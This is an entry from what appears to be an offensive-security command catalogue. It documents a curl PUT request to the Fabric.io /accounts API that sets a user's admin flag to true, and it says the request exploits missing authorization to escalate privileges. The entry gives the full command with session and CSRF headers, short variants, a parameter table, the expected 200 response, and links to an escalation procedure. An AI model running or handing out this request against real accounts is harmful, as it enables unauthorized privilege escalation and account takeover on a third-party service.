---
id: cmd-put-update-admin-status
data: >-
  curl -X PUT "https://fabric.io/accounts/54aa4ab19ea6961359001260" -H
  "Content-Type: application/json; charset=UTF-8" -H "X-CSRF-Token: ..." -H
  "X-CRASHLYTICS-DEVELOPER-TOKEN: ..." -H "X-Requested-With: XMLHttpRequest" -H
  "Referer: https://fabric.io/settings/apps/[appid]/team_members" -H "Cookie:
  _fabric_session=..." -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X
  10.9; rv:34.0) Gecko/20100101 Firefox/34.0" -d '{"admin":true}'
tags:
  - api
  - escalation
type: command
output: HTTP/1.1 200 OK (User role updated to admin)
executor: bash
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:28:51.518Z'
verified: false
validated: true
submitted: true
---
# put-update-admin-status

## Command

```bash
curl -X PUT "https://fabric.io/accounts/54aa4ab19ea6961359001260" \
  -H "Content-Type: application/json; charset=UTF-8" \
  -H "X-CSRF-Token: ..." \
  -H "X-CRASHLYTICS-DEVELOPER-TOKEN: ..." \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://fabric.io/settings/apps/[appid]/team_members" \
  -H "Cookie: _fabric_session=..." \
  -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0" \
  -d '{"admin":true}'
```

## Description

This command updates a user's admin status to true via the Fabric.io /accounts API, exploiting missing authorization to escalate privileges. Use after obtaining the user ID to perform the escalation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `[user_id]` | Target user ID (e.g., 54aa4ab19ea6961359001260) | Yes |
| `{"admin":true}` | JSON payload setting admin flag | Yes |
| `X-CSRF-Token` | CSRF protection token from session | Yes |
| `Cookie: _fabric_session=...` | Authenticated session | Yes |
| `[appid]` | App ID for referer | Yes |

## Examples

### Basic Usage

```bash
curl -X PUT "https://fabric.io/accounts/[user_id]" -H "Content-Type: application/json" -H "Cookie: ..." -d '{"admin":true}'
```

### Advanced Usage

```bash
curl -X PUT "https://fabric.io/accounts/54aa4ab19ea6961359001260" -H "..." -d '{"admin":true}' -v
```

## Expected Output

HTTP 200 OK response, possibly with empty body or confirmation. Verify via subsequent GET; the role should now be admin.

## Related

- [[commands/get-team-members]]
- [[procedures/Escalate-Privileges-by-Updating-Admin-Status]]
